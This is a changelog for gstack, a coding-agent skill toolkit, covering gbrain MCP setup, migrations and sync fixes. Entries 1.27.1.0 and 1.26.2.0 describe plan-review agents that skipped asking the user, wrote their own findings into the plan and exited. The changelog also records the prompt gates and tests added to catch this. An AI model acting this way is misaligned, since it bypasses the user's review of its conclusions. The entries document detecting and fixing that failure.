# Changelog

## [1.27.1.0] - 2026-05-06

## **Plan-mode reviews now refuse to dump findings without asking. Four gate-tier tests catch the regression on every PR.**

The four `/plan-*-review` skills (eng, ceo, design, devex) gain an
anti-shortcut clause baked in via a single shared resolver. The clause
names the May 2026 transcript-bug failure mode directly: model explores,
finds issues, dumps every finding into one plan write, calls
ExitPlanMode without firing AskUserQuestion. The new clause closes that
loophole: "the plan file is the OUTPUT of the interactive review, not a
substitute for it." Future tightening edits one resolver, all four
skills update on the next gen-skill-docs.

Four gate-tier E2E tests catch the regression class on every PR that
touches the four templates, the shared resolver, or the seeds fixture.
Each test drives the matching skill against a small "forcing finding"
seed and asserts the agent fires at least one AskUserQuestion before
reaching plan_ready. ~1-3 min wall time per test, ~$2-6 total per CI
hit. Eng floor: 59s. CEO floor: 197s. All four pass against the new
template.

### The numbers that matter

Verified end-to-end via live PTY runs against `claude` plan mode:

| Surface | Before | After | Δ |
|---|---|---|---|
| Plan-mode reviews with anti-shortcut clause | 0/4 | 4/4 | full coverage of plan-* family |
| Gate-tier regression tests for the transcript-bug class | 0 | 4 | one per skill |
| Wall time per floor test (typical) | n/a | 30s-3m | early exit on first AUQ render |
| Cost per gate run (when triggered) | n/a | ~$2-6 | diff-gated; only fires on relevant edits |
| Lines added / deleted | — | +450 / −3 | additive; no breaking changes |

The floor tests use a focused observer (`runPlanSkillFloorCheck`) that
exits at the first non-permission numbered-option render. Existing
periodic finding-count tests use `runPlanSkillCounting` for full
fingerprint analysis on a 25-min budget; the floor variant trades
fingerprint precision for early-exit reliability so it fits gate-tier
constraints. Both helpers live side-by-side in
`test/helpers/claude-pty-runner.ts`.

### What this means for the four review skills

Every plan-* review now has a structural rule against the precise
failure mode the transcript exhibited. The anti-shortcut clause
appears in the rendered prompt right after the existing Anti-skip
rule, so it's read alongside the per-section STOP gates v1.26.2.0
already added. If a future model regression revives the bug, the
gate-tier floor test fires with full PTY evidence on the next PR.

### Itemized changes

#### Added
- **`generateAntiShortcutClause` resolver** in `scripts/resolvers/review.ts`,
  registered as `{{ANTI_SHORTCUT_CLAUSE}}` in the `RESOLVERS` map.
  Plan-* SKILL.md.tmpl files include it via one placeholder line.
- **`runPlanSkillFloorCheck` PTY helper** in
  `test/helpers/claude-pty-runner.ts` — minimal "did the agent fire ANY
  AskUserQuestion?" observer with early exit on first non-permission
  numbered-option render.
- **Four gate-tier finding-floor E2E tests** in
  `test/skill-e2e-plan-{eng,ceo,design,devex}-finding-floor.test.ts`,
  each using the shared `runPlanSkillFloorCheck` helper.
- **Four forcing-finding seeds** in `test/fixtures/forcing-finding-seeds.ts`,
  one per skill, each engineered to surface at least one finding under
  that skill's review focus.

#### Changed
- **All four `plan-*-review` SKILL.md** files now include the
  anti-shortcut clause immediately after the `**Anti-skip rule:**`
  paragraph. Anchored on the paragraph (not the surrounding heading)
  so the same insertion works across all four templates regardless of
  their differing section labels.
- **`test/helpers/touchfiles.ts`** adds 4 entries to `E2E_TOUCHFILES`
  and `E2E_TIERS=gate`. The new entries depend on the matching skill
  template, the shared resolver, the seeds fixture, and the PTY
  runner helper.
- **`test/touchfiles.test.ts`** count assertion bumped 21→22 with
  explicit `plan-ceo-finding-floor` containment.

## [1.27.0.0] - 2026-05-06

## **`/setup-gbrain` connects to a remote brain in one paste. Brain repo renamed to gstack-artifacts.**

`/setup-gbrain` now has a fourth path: paste a remote MCP URL plus a bearer
token, and the skill registers it as your gbrain MCP without provisioning a
local brain DB. No PGLite to install, no Supabase project to set up. Just
point this Mac at a brain that already runs somewhere else (Tailscale node,
ngrok endpoint, internal LAN, a teammate's server) and you have search +
write working in one Claude Code session restart. The same flow optionally
provisions a private `gstack-artifacts-$USER` repo on GitHub OR GitLab so
the remote brain can ingest your CEO plans, designs, and reports as a
federated source. The renamed repo replaces `gstack-brain-$USER` with a
clearer name; existing users get a journaled, interruption-safe migration
that handles the GitHub repo rename, the on-disk file moves, the config
key rewrite, and the gbrain federated-source swap (add-new-before-remove-old,
no downtime window).

### The numbers that matter

Verified end-to-end against a live remote brain (wintermute on Tailscale,
gbrain v0.27.1, 96K pages) plus the new test suite:

| Surface | Before | After | Δ |
|---|---|---|---|
| `/setup-gbrain` paths | 3 (Supabase / PGLite / Switch) | 4 (Supabase / PGLite / Switch / Remote MCP) | +1 path, no local install required |
| Time to working remote MCP | manual `claude mcp add --transport http`, then skip the rest of the skill | one Path 4 walkthrough, full verify + artifact-repo provision | ~30 sec setup, agent guided |
| Verify failure modes classified | none (raw curl error) | NETWORK / AUTH / MALFORMED, each with one-line remediation hint | 3 buckets, 0 wrong-layer debugging |
| Migration interruption safety | partial-state on Ctrl-C | journal at `.migrations/v1.27.0.0.journal`, resumes from the next un-done step | 6-step atomic rollback |
| Rename blast radius | one bin script | bin + scripts/ + 8 generated SKILL.md surfaces | grep regression test guards every caller |
| Tests added | — | 59 unit + 2 gate-tier E2E + 4 regression | full coverage of the rename + Path 4 prose contract |

| Path 4 step | What runs | Local dependency |
|---|---|---|
| Step 4c verify | `gstack-gbrain-mcp-verify $URL` (curl POST initialize) | none |
| Step 5a register | `claude mcp add --scope user --transport http gbrain $URL --header "Authorization: Bearer $TOKEN"` | claude CLI |
| Step 7 artifacts | `gstack-artifacts-init` (gh OR glab OR manual URL paste) | gh / glab / git |
| Step 8 CLAUDE.md | mode-aware block; token NEVER written to CLAUDE.md (only `~/.claude.json`) | filesystem |
| Step 9 smoke test | prints curl-equivalent for post-restart manual verification | none |

The verify helper's `Accept: application/json, text/event-stream` requirement
is a regression-tested invariant. Every MCP server that ships HTTP transport
returns 406 Not Acceptable without both values; missing this header costs
about 10 minutes of debugging per fresh setup.

### What this means for users running gbrain across machines

If you have a brain on a different Mac, a Tailscale-connected server, or a
teammate runs one for the team, you no longer need a local install on every
client. One paste of URL + bearer registers the MCP at user scope; restart
Claude Code and `mcp__gbrain__search` and friends become callable. The
artifacts repo is per-user (private), so each developer pushes their own
plans/designs/reports without crossing trust surfaces. Renaming
`gstack-brain-$USER` to `gstack-artifacts-$USER` is automatic if you accept
the migration prompt; everything keeps working if you decline.

Existing local-mode users (PGLite or Supabase) see no behavior change beyond
the rename. The path you picked in `/setup-gbrain` Step 2 still runs end to
end, just under the new "artifacts" terminology.

### Itemized changes

#### Added

- **`/setup-gbrain` Path 4 (Remote MCP).** Step 2 gains a fourth option:
  paste an HTTPS MCP URL plus a bearer token. The skill verifies via
  `gstack-gbrain-mcp-verify` (NETWORK / AUTH / MALFORMED classifier with
  one-line remediation hints), registers via `claude mcp add --scope user
  --transport http gbrain --header "Authorization: Bearer ..."`, then
  skips local install / doctor / transcript ingest because Path 4 has
  no local dependencies. Steps 5, 5a, 7, 8, 9, 10 all branch on mode.
  Idempotent re-run skips Step 2 entirely when `gbrain_mcp_mode=remote-http`
  is already detected.
- **`bin/gstack-gbrain-mcp-verify`** (new). POSTs `initialize` to a remote
  MCP URL with the bearer from `$GBRAIN_MCP_TOKEN` (never argv) and
  classifies failures into NETWORK / AUTH / MALFORMED with concrete
  remediation hints. Probes `tools/list` for forward-compat with future
  gbrain releases that ship `mcp__gbrain__sources_add` (returns
  `sources_add_url_supported: true|false`).
- **`bin/gstack-artifacts-init`** (new). Replaces `gstack-brain-init`. Asks
  the user to pick GitHub (auto via `gh`), GitLab (auto via `glab`), or
  manual URL paste. Creates `gstack-artifacts-$USER` (private), stores the
  HTTPS URL canonically in `~/.gstack-artifacts-remote.txt`, and prints the
  brain-admin hookup command labeled "Send this to your brain admin" (always
  prints, never auto-executes — see `setup-gbrain/memory.md` for why).
- **`bin/gstack-artifacts-url`** (new). Small helper for HTTPS↔SSH
  conversion plus host / owner-repo extraction. Mirrors the spirit of
  `gstack-slug` so URL-format string-mangling lives in one place.
- **`gbrain_mcp_mode` field in `gstack-gbrain-detect` output.** 3-tier
  fallback: `claude mcp get gbrain --json` → `claude mcp list` text-grep →
  `~/.claude.json` jq read. Defense in depth: if Anthropic moves the file
  format, the first two tiers absorb it.
- **`gstack-upgrade/migrations/v1.27.0.0.sh`**. Six-step journaled migration
  for the brain → artifacts rename. Each step writes its name to
  `~/.gstack/.migrations/v1.27.0.0.journal` on success; re-entry resumes
  from the next un-done step. On final success, journal is replaced by
  `v1.27.0.0.done`. User opt-out writes a `skipped-by-user` marker so the
  prompt doesn't fire again until `/setup-gbrain --rerun-migration`.
- **`setup-gbrain/memory.md`** has a new "Path 4: Remote MCP setup"
  section covering the bearer storage trade-off, the always-print
  brain-admin hookup pattern, the CLAUDE.md block format (no token), and
  token-rotation guidance.

#### Changed

- **`gbrain_sync_mode` config key renamed to `artifacts_sync_mode`.** Hard
  rename, no dual-read alias. The migration script rewrites the key in
  `~/.gstack/config.yaml` and any "## GBrain Configuration" block in
  CLAUDE.md. Internal callers updated:
  `bin/gstack-config`, `bin/gstack-gbrain-detect`, `bin/gstack-brain-sync`,
  `bin/gstack-brain-enqueue`, `bin/gstack-brain-uninstall`,
  `bin/gstack-timeline-log`, `scripts/resolvers/preamble/generate-brain-sync-block.ts`.
- **Preamble `BRAIN_SYNC: ...` line renamed to `ARTIFACTS_SYNC: ...`** and
  branches on `gbrain_mcp_mode`. In remote-http mode it emits
  `ARTIFACTS_SYNC: remote-mode (managed by brain server <host>)` to make
  clear that local sync is a no-op by design.
- **`bin/gstack-brain-restore`, `bin/gstack-gbrain-source-wireup`, and
  `bin/gstack-brain-uninstall`** read `~/.gstack-artifacts-remote.txt` with
  `~/.gstack-brain-remote.txt` as a migration-window fallback. Once the
  v1.27.0.0 migration runs, only the artifacts file remains.
- **`/sync-gbrain` is a graceful no-op in remote-http mode** (V1). Prints a
  one-line note pointing at the brain server and exits cleanly. Local-mode
  users see no change.

#### Removed

- **`bin/gstack-brain-init` deleted.** Replaced by `bin/gstack-artifacts-init`.
  Anyone running the old name post-upgrade gets a clean "command not found"
  rather than a silent rename — per the gstack rule "avoid backwards-
  compatibility hacks." Existing users on disk have their state migrated by
  v1.27.0.0.sh.
- **`test/gstack-brain-init-gh-mock.test.ts` deleted.** Replaced by
  `test/gstack-artifacts-init.test.ts` covering the same gh-mock pattern
  plus the new GitLab branch and the brain-admin printout.

#### For contributors

- **59 new unit tests + 2 gate-tier E2E tests + 4 regression tests.**
  Highlights:
  - `test/gstack-gbrain-mcp-verify.test.ts` (13 tests) covers each error
    class via mocked curl, asserts the dual `Accept` header is set on
    every call, regression-tests the token-never-on-stdout invariant.
  - `test/gstack-artifacts-init.test.ts` (16 tests) covers gh / glab /
    both / neither provider selection, HTTPS canonical storage, the
    URL-form-supported branch in the brain-admin printout, and idempotent
    re-run.
  - `test/gstack-gbrain-detect-mcp-mode.test.ts` (19 tests) verifies each
    of the 3 detection tiers in isolation, plus the schema-regression
    check that `/sync-gbrain`'s parser doesn't break on the new fields.
  - `test/migrations-v1.27.0.0.test.ts` (11 tests) covers all six
    migration steps including journal-resume, idempotent re-run, the
    add-before-remove ordering for source swap, and the remote-MCP
    print-only branch.
  - `test/no-stale-gstack-brain-refs.test.ts` greps the broader tree
    (bin, scripts, *.tmpl, generated *.md, test/) for stale identifiers.
  - `test/post-rename-doc-regen.test.ts` confirms gen-skill-docs output
    has no `gstack-brain` strings post-rename.
  - `test/setup-gbrain-path4-structure.test.ts` is a fast structural lint
    that catches AUQ-pacing regressions in the Path 4 prose without
    spending eval tokens.
- **`scripts/resolvers/preamble/generate-brain-sync-block.ts`** detects
  remote-http mode by reading `~/.claude.json` directly (no claude
  subprocess on every preamble — the hot path stays fast).
- **`test/helpers/touchfiles.ts`** wires `setup-gbrain-remote` and
  `setup-gbrain-bad-token` into the gate-tier E2E selection.
- **Preamble byte budget ratcheted from 35K to 36.5K** to honor the
  remote-mode probe in `generate-brain-sync-block.ts`.

## [1.26.5.0] - 2026-05-06

## **The v1.26 memory feature now actually works on a fresh `/setup-gbrain` install, and `/sync-gbrain --full` actually registers github-hosted code sources.**

Two fix-wave bugs closed in one ship. Until this version, the headline v1.26 features ended setup green but did nothing: every transcript page failed `Unknown command: put_page`, and every `github.com/<org>/<repo>` repo got rejected for an invalid source id. After upgrade, clean-install transcripts land in gbrain with title/type/tags intact, and any github-hosted repo registers a code source on the first try.

### The numbers that matter

Both numbers come from running the binaries against the real gbrain v0.25.1 install on this machine, against `origin/main` first (buggy) and the merged branch second.

| Surface | Before (v1.26.4.0) | After (v1.26.5.0) | Δ |
|---|---|---|---|
| Memory-ingest writer verb | `gbrain put_page --slug ... --title ...` (CLI rejects: `Unknown command`) | `gbrain put <slug>` with frontmatter (CLI accepts) | from 100% fail to 0% fail |
| Transcript pages with title/type/tags | none — fields rode CLI flags that no gbrain version accepts | injected into existing frontmatter on every page | search/filter by `--type transcript` actually returns results now |
| Source id derived for `github.com/garrytan/gstack` | `gstack-code-github.com-garrytan-gstack` (38 chars, contains `.`, fails gbrain `[a-z0-9-]{1,32}` validator) | `gstack-code-garrytan-gstack` (27 chars, valid) | 100% of github-hosted repos go from rejected to accepted |
| Availability probe failure mode | every page errors with `Unknown command: put_page` | one clean error: `gbrain CLI not in PATH or missing put subcommand` | log spam goes from N copies to 1 |
| Available `gbrainPutPage()` timeout | 30 s (auto-link reconciliation hits 30 s on dense brains) | 60 s | brains with hundreds of existing pages stop hitting the ceiling on every put |
| `gbrainPutPage()` error surface | `Command failed:` (Node truncates 1 MB stderr) | first 300 chars of `err.stderr` | debugging stops requiring strace; the failure is visible |

The `gbrain put` verb has existed since v0.18.2 and was always the right CLI surface. The `put_page` shape was the MCP tool name leaking into the CLI path. The hybrid writer now handles both transcript pages (existing frontmatter from `buildTranscriptPage`, inject title/type/tags into it) and raw artifact pages (no frontmatter, wrap with new frontmatter).

### What this means for new users

Run `/setup-gbrain` on a clean install, choose any path, and Step 7.5 actually populates the brain with your transcripts plus their metadata. Run `/sync-gbrain --full` on any github-hosted repo and the code stage registers the source instead of failing the `sources add` validator. The headline v1.26 features finally do the thing they shipped to do.

### Itemized changes

#### Fixed
- `bin/gstack-memory-ingest.ts:gbrainPutPage` — switched the writer from the legacy flag-based `gbrain put_page --slug X --title Y --type Z --tags T` form to the CLI surface `gbrain put <slug>` (positional slug, content via stdin, metadata in YAML frontmatter). Two-branch hybrid: when the page body already starts with frontmatter (transcript pages from `buildTranscriptPage`, which prepends agent/session_id/cwd/git_remote/etc. but no title/type/tags), inject title/type/tags into the existing block before the closing `---`. When the body has no frontmatter (raw artifact pages: design-docs, learnings, builder-profile-entries), wrap with a fresh frontmatter carrying the same fields. Either branch produces a page that gbrain's pages list, search, and tag filters actually surface. Contributed by @smithjoshua (PR #1328: base writer + 60 s timeout + 16 MB maxBuffer + stderr first-line surface) and the artifact-wrap branch added on top here.
- `bin/gstack-memory-ingest.ts:gbrainAvailable` — adds a `gbrain --help` probe with a regex anchored on the indented subcommand format (`/^\s+put\s/m`). Replaces the previous `command -v` only check. If a future gbrain renames or removes `put`, the writer fails fast with one clean error per ingest pass instead of N copies of `Unknown command: put_page`. Contributed by @AZ-1224 (PR #1341: probe origin); regex tightening added on top here per Codex P2 plan-review feedback.
- `bin/gstack-gbrain-sync.ts:deriveCodeSourceId` — drops the host segment from canonical remote URLs (the same `github.com-` prefix on every user's id was eating 12 chars of the 32-char gbrain budget for nothing) and falls back to a 6-char sha1 hash on the slug tail when org/repo names still exceed the limit. Every `github.com/<org>/<repo>` derives a gbrain-valid id on the first try. Contributed by @radubach (PR #1330).
- `bin/gstack-gbrain-sync.ts:constrainSourceId` — handles the empty-slug edge case (input sanitizes to all non-alnum chars). Pre-fix the function returned `${prefix}-` which fails gbrain's validator on the trailing hyphen; now falls back to a deterministic sha1-prefixed id. Surfaced via the new `basename-sanitizes-to-empty` regression test added in this version per Codex plan-review.

#### Added
- `test/gstack-memory-ingest.test.ts` — two regression tests stand up a fake `gbrain` shim on PATH and run the real `--bulk` ingest pipeline against a planted Claude Code session. The first asserts the writer hits `gbrain put <slug>` (not `put_page`) and that title, type, AND tags arrive in the put stdin. The second points the writer at a legacy-only shim and asserts the availability probe surfaces a single missing-subcommand error instead of N per-page failures. Contributed by @AZ-1224 (PR #1341); the assertions for title/type/tags arriving in stdin are added on top here. The strengthened test surfaced a deeper issue in PR #1328's inject branch: it searched for `\n---\n` (with trailing newline) but `buildTranscriptPage` joins frontmatter without a trailing newline, so the search never matched. Two-line fix on top: search for `\n---` only.
- `test/gstack-gbrain-sync.test.ts` — four cases from PR #1330 (dot-host, SCP-style remote, multi-dot host, long org/repo forcing hash-truncate) plus two new edge cases this version (no-origin fallback path; basename-sanitizes-to-empty). Each test spawns the CLI inside a temp git repo and asserts the derived id passes gbrain's validator regex. Contributed by @radubach for the four core cases.

#### For contributors
- Codex outside-voice plan review caught three P1 ship-blockers in the originally proposed merge (the no-frontmatter-wrap branch from PR #1341 alone would have silently dropped title/type/tags from every transcript page — its own tests passed because they only asserted `agent: claude-code`). The plan pivoted from `merge #1341 + cherry-pick from #1328` to `merge #1328 + hybrid writer + cherry-pick #1341's tests, strengthened`. Two-pass live smoke against real gbrain (where the database connects) confirmed source-id length goes 38 → 27 chars; memory-ingest writer correctness was verified by the strengthened shim tests against a real `gbrain` CLI process.
- Two follow-up TODOs filed: P2 to bump the `bin/gstack-gbrain-install` pin in lockstep with gstack memory-feature releases (issue #1305 part 2), P3 to handle source-id cross-host collisions (`github.com/acme/foo` and `gitlab.com/acme/foo` currently collapse to the same id; rare but silent).

## [1.26.4.0] - 2026-05-05

## **`/autoplan` review reports now reliably land at the bottom of the plan, even when an older copy lives mid-file.**

The `## GSTACK REVIEW REPORT` section had a write rule that contradicted itself: one bullet said "replace it entirely (in place)" while another said "always last section, move if mid-file." When the agent inherited a plan whose prior `/autoplan` run had landed before user-added sections, the in-place replace path won and the new report stayed mid-file. The user opened ExitPlanMode, saw their plan with no review at the bottom, and had to ask twice. Single delete-then-append rule now, with a Read-tool verification step before the next instruction runs.

### What you can now do

- **Run `/autoplan` against a plan that already has a stale `## GSTACK REVIEW REPORT` mid-file and trust the new report ends up at the bottom.** The instruction in `scripts/resolvers/review.ts` (which feeds `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/codex`, `/devex-review`) now reads as one rule: search for any existing report section, delete it wherever it lives, append a fresh report at end of file, verify with the Read tool that the report is the last `##` heading. No more contradiction for the agent to reconcile.

### What gets safer

- **Five static template assertions in `test/gen-skill-docs.test.ts` lock the prompt change against drift.** Each plan-review SKILL.md (4 of them) plus the source resolver are checked for the new "delete-then-append flow" / "never mid-file" / "Do NOT replace the section in place" markers AND the absence of the old "replace it** entirely using the Edit tool" / "If it was found mid-file, move it" bullets. Synthetic regression check confirmed: all 5 fail when the prompt is reverted, all 5 pass when restored. The tests are bound to the change, not to incidentally green output.

### Itemized changes

#### Changed
- `scripts/resolvers/review.ts` — "Write to the plan file" subsection rewritten. Old contradictory pair ("replace it entirely" vs "always last / move if mid-file") collapsed into a single 4-step delete-then-append flow with explicit verification.
- All 6 generated SKILL.md files refreshed to carry the new instruction: `plan-ceo-review`, `plan-design-review`, `plan-devex-review`, `plan-eng-review`, `codex`, `devex-review`.

#### Added
- `test/gen-skill-docs.test.ts` — new `GSTACK REVIEW REPORT delete-then-append flow` describe block: 4 SKILL.md target tests + 1 source resolver test. Static, deterministic, free.

#### For contributors
- The `/autoplan` E2E approach attempted in the plan was dropped after a paid run revealed that `--disallowedTools AskUserQuestion` makes autoplan bail at the Phase 1 premise gate via the plan-file fallback. The PTY harness can't drive autoplan through its review phases without auto-progression of AskUserQuestions. The static prompt-text test catches the load-bearing change without needing that infrastructure.

## [1.26.3.0] - 2026-05-03

## **`/sync-gbrain` keeps your brain current and teaches the agent when to use it.**

Two functional gaps closed in one ship: the cwd repo wasn't actually being indexed by gbrain (the orchestrator called `gbrain import` which only handles markdown directories, not code), and the coding agent had no idea gbrain existed in any session that didn't explicitly opt in. Both fixed by switching to gbrain v0.20.0+'s native code surfaces and adding a CLAUDE.md guidance block that's gated on a working capability check.

### What you can now do

- **Run `/sync-gbrain` to refresh gbrain against this repo's code.** Default is `--incremental` (mtime fast-path, ~50ms). `--full` runs `gbrain reindex-code` for a full re-index. `--dry-run` previews what would sync without writing anywhere. `--code-only`, `--no-memory`, `--no-brain-sync`, `--quiet` all work.
- **Use `gbrain code-def`/`code-refs`/`code-callers`/`code-callees` against your repo.** /sync-gbrain registers the cwd as a federated source via `gbrain sources add` (idempotent — id is `gstack-code-<repo_slug>`), then runs `gbrain sync --strategy code`. The native code surfaces just work afterward.
- **Get gbrain hints in every gstack skill preamble.** When gbrain is configured AND the cwd source has page_count > 0, every skill start emits a 4-line "prefer `gbrain search`/`code-def`/`code-refs` over Grep" hint. When configured but the corpus is empty, you get a 3-line emergency hint nudging you to run `/sync-gbrain --full`. When gbrain isn't configured, the hint resolves to empty string — zero context tax for non-gbrain users.
- **Find the long-form guidance in CLAUDE.md.** `/sync-gbrain` (and `/setup-gbrain` Step 8) write a `## GBrain Search Guidance` block delimited by HTML comments, with concrete CLI commands for semantic search, symbol-aware code lookup, and curated-memory queries. The block is removed automatically when the capability check fails, so a Mac with synced repo CLAUDE.md but no local gbrain doesn't end up telling the agent to use tools that don't exist.

### What gets safer

- **Concurrent /sync-gbrain runs from two terminals don't corrupt CLAUDE.md or `.gbrain-sync-state.json`.** Lock file at `~/.gstack/.sync-gbrain.lock` with PID + timestamp. Stale-lock takeover after 5 min. Both files written via tmp+atomic-rename. SIGINT/SIGTERM trap releases the lock.
- **`--dry-run` actually doesn't write anywhere.** Previously the orchestrator skipped only the `gbrain import` call; now it skips `sources add`, `sync --strategy code`, the state file, AND the CLAUDE.md guidance block. Print "would: ..." lines for every action.
- **The capability check is narrower than `gbrain doctor`.** Doctor exits "unhealthy" for unrelated reasons (`resolver_health` warnings, `minions_migration` partial-installs) on otherwise-functional brains. /sync-gbrain uses a write+search round-trip (`gbrain put $SLUG | gbrain search ping | grep $SLUG`) which actually tests what we care about: can the agent search.

### Itemized changes

#### Added
- New `lib/gbrain-sources.ts` — `ensureSourceRegistered(id, path, options)` + `probeSource(id, env)` + `sourcePageCount(id, env)` helpers. Production callers leave `env` unset (inherit `process.env`); tests pass a custom env to point at a fake `gbrain` on PATH.
- New `sync-gbrain/SKILL.md.tmpl` — top-level skill, ~250 lines.
- New `test/gbrain-sources.test.ts` — 9 unit tests with a fake gbrain shell script on PATH (jq-driven state file, no real DB needed).
- Lock-file primitives (`acquireLock` / `releaseLock`) in the orchestrator.
- New code-stage detail schema in `.gbrain-sync-state.json`: `last_stages.code.detail = {source_id, source_path, page_count, last_imported, status}`.

#### Changed
- `bin/gstack-gbrain-sync.ts` `runCodeImport` rewritten to use `gbrain sources add` + `gbrain sync --strategy code` (incremental) or `gbrain reindex-code --yes` (`--full`) instead of `gbrain import`. State file written via tmp+rename for atomicity.
- `setup-gbrain/SKILL.md.tmpl` Step 8 now writes both `## GBrain Configuration` AND `## GBrain Search Guidance` blocks, gated on Step 9 smoke test pass.
- `scripts/resolvers/preamble/generate-brain-sync-block.ts` emits Variant A (4 lines, healthy) / Variant B (3 lines, empty corpus) / empty string (gbrain not configured). Reads cached cwd page_count from the state file (handles pretty + compact JSON via `tr -d '\n'` flatten).
- `test/gen-skill-docs.test.ts` plan-review preamble byte budget bumped 33000 → 35000 to absorb the new context-load block.
- `test/gstack-gbrain-sync.test.ts` updated for native code surfaces (12 tests, was 8) — adds source-id derivation, dry-run no-lock, stale-lock takeover, fresh-lock blocking.
- `test/skill-e2e-memory-pipeline.test.ts` updated to assert `would: gbrain sources add` instead of `would: gbrain import`.
- Ship golden fixtures (`test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md`) refreshed.

#### For contributors
- The 4-digit `MAJOR.MINOR.PATCH.MICRO` version in `package.json` and `VERSION` is the source of truth.
- Run `bun run gen:skill-docs --host all` after editing any `.tmpl` to regenerate per-host SKILL.md files; commit both.
- gbrain v0.25.1 already ships `gbrain sync --watch [--interval N]` and `gbrain sync --install-cron` natively. The previously-deferred V1.5 P0 daemon can wire through to those rather than building a gstack-side watcher.

## [1.26.2.0] - 2026-05-03

## **`/plan-eng-review` always asks. Never silently writes findings to your plan first.**

Plan-mode review skills now have a hard STOP gate before any AskUserQuestion. The bug
this closes: a `/plan-eng-review` session would do Step 0 scope challenge, find real
issues, write the findings into the plan file as prose, then call `ExitPlanMode` —
never invoking AskUserQuestion. The user only saw "ready to execute" with the model's
opinions already baked in. The tool to surface the question existed, the prompt
told the model to use it, and the model still routed around it.

Five sites in `plan-eng-review/SKILL.md.tmpl` now use the office-hours `b512be71`
pattern verbatim: "the AskUserQuestion call is a tool_use, not prose — call the
tool directly," named blockers ("do not edit the plan file, do not call
ExitPlanMode"), and an anti-rationalization clause ("loading the schema via
ToolSearch and writing the recommendation as chat prose is the failure mode this
gate exists to prevent"). The four review-section gates (Architecture, Code
Quality, Test, Performance) and the Step 0 complexity-check trigger all use the
same language.

### What you can now do

- **Trust that any plan-* review skill that produces a plan file ends with the review report.** All four plan-mode E2E tests (`plan-eng`, `plan-ceo`, `plan-design`, `plan-devex`) now assert `## GSTACK REVIEW REPORT` is the last `## ` section of the plan file whenever one was written. The `{{PLAN_FILE_REVIEW_REPORT}}` resolver mandated this contract; nothing tested it until now.
- **Catch the "writes findings to plan as prose before asking" failure mode.** New `wrote_findings_before_asking` classifier outcome fires when a `Write`/`Edit` to `.claude/plans/*` precedes any AskUserQuestion render in the session window. Opt-in via `strictPlanWrites: true` so existing tests where zero-findings → write plan → plan_ready stays legitimate.
- **Run `plan-design-review-plan-mode` on PR CI again.** The touchfiles entry was duplicated — `plan-design-review-plan-mode` appeared at line 94 (gate, full deps) and line 243 (smaller deps). JS object literals: later wins. The effective tier was `periodic`, not `gate`. Three of four plan-mode siblings ran on every PR; design didn't.

### Itemized changes

#### Added

- `runPlanSkillObservation`'s `initialPlanContent?: string` option. Pre-pumps a user message containing the seeded plan before invoking the skill, with a 3s gap so the message renders before the slash command.
- `ClassifyResult` outcome `wrote_findings_before_asking` with companion `strictPlanWrites?` opt on `classifyVisible`. Six new unit tests in `claude-pty-runner.unit.test.ts` cover before/after-AUQ ordering plus the strict-off legacy path.
- Shared test helper `assertReportAtBottomIfPlanWritten(obs)` in `claude-pty-runner.ts`. Wraps the existing `assertReviewReportAtBottom(content)` and gates on `obs.planFile` (artifact existing), so the assertion fires under `'asked'` and `'plan_ready'` both — wherever a plan file was actually written.
- New seeded-plan test case in `skill-e2e-plan-eng-plan-mode.test.ts`: `STOP gate fires when seeded plan forces Step 0 findings`. Combines `initialPlanContent` + `--disallowedTools AskUserQuestion` to force the Conductor MCP-variant path through `mcp__*__AskUserQuestion`.

#### Changed

- `plan-eng-review/SKILL.md.tmpl` lines 116, 139, 152, 160, 169 ported from soft "STOP." prose to the office-hours pattern. Adds tool_use reminder, names blocked next steps explicitly, anti-rationalization clause.
- `runPlanSkillObservation` now captures `obs.planFile` on every classifier outcome (was: only `'plan_ready'`). Catches the case where the skill wrote a plan partway through then paused on a question.

#### Fixed

- `test/helpers/touchfiles.ts` duplicate `plan-design-review-plan-mode` keys deleted (line 243 in `E2E_TOUCHFILES`, line 524 in `E2E_TIERS`). Effective tier is now `gate` again, matching the other three siblings.
- `scripts/resolvers/review.ts` added to all four plan-mode-test touchfiles entries so changes to the `{{PLAN_FILE_REVIEW_REPORT}}` resolver text trigger all four sibling tests in `bun run eval:select`.

#### For contributors

- 6 new classifier unit tests in `test/helpers/claude-pty-runner.unit.test.ts` (70 → 76).
- New `initialPlanContent?: string` option on `runPlanSkillObservation` for seeding a draft plan into a test run before invoking the skill. Lets STOP-gate regression tests pre-pump guaranteed-finding-triggering complexity (8+ files, custom-vs-builtin smell) so the skill has something concrete to react to.

## [1.26.1.0] - 2026-05-03

## **`gstack-gbrain-sync` ships host-agnostic. Curated artifacts push from Claude Code, Codex CLI, or a dev workspace — same orchestrator, same install, same result.**

The orchestrator resolves its sibling `gstack-brain-sync` binary via `import.meta.dir`, matching the pattern already in `runMemoryIngest`. Path resolution stays anchored to where the script actually lives, not to a hardcoded host install root, so the curated-git-push stage runs end-to-end on every host gstack supports.

### What you can now do

- **Run `gstack-gbrain-sync` from any host install and watch curated artifacts land in the remote.** End-to-end smoke from a Conductor workspace: `bun run bin/gstack-gbrain-sync.ts --incremental --no-code --no-memory --quiet` returns `{"name": "brain-sync", "ran": true, "ok": true, "summary": "curated artifacts pushed"}`. The stage runs on Codex CLI installs and dev checkouts the same way it runs under Claude Code.

### Changed

- `runBrainSyncPush` (`bin/gstack-gbrain-sync.ts:222`) resolves the curated-push binary as a sibling of the running script. One line, single source of truth: `join(import.meta.dir, "gstack-brain-sync")`.

### For contributors

- New regression test in `test/gstack-gbrain-sync.test.ts` pins sibling-resolution behavior so future refactors can't drift the orchestrator back to a host-coupled path.
- `plan-review` preamble byte ratchet bumped from 33 KB to 34 KB to honor the gbrain-sync block and AskUserQuestion recommendation pattern that shipped in v1.25.1.0/v1.26.0.0. The test's own comment authorizes this exact kind of intentional-growth ratchet bump.
- `claude-ship-SKILL.md` and `factory-ship-SKILL.md` golden fixtures regenerated against the live `/ship` template (canonical `Recommendation:` line from v1.25.1.0 now reflected in the goldens).

## [1.26.0.0] - 2026-05-02

## **Your coding agent now remembers everything. Every gstack skill auto-loads what you actually did.**

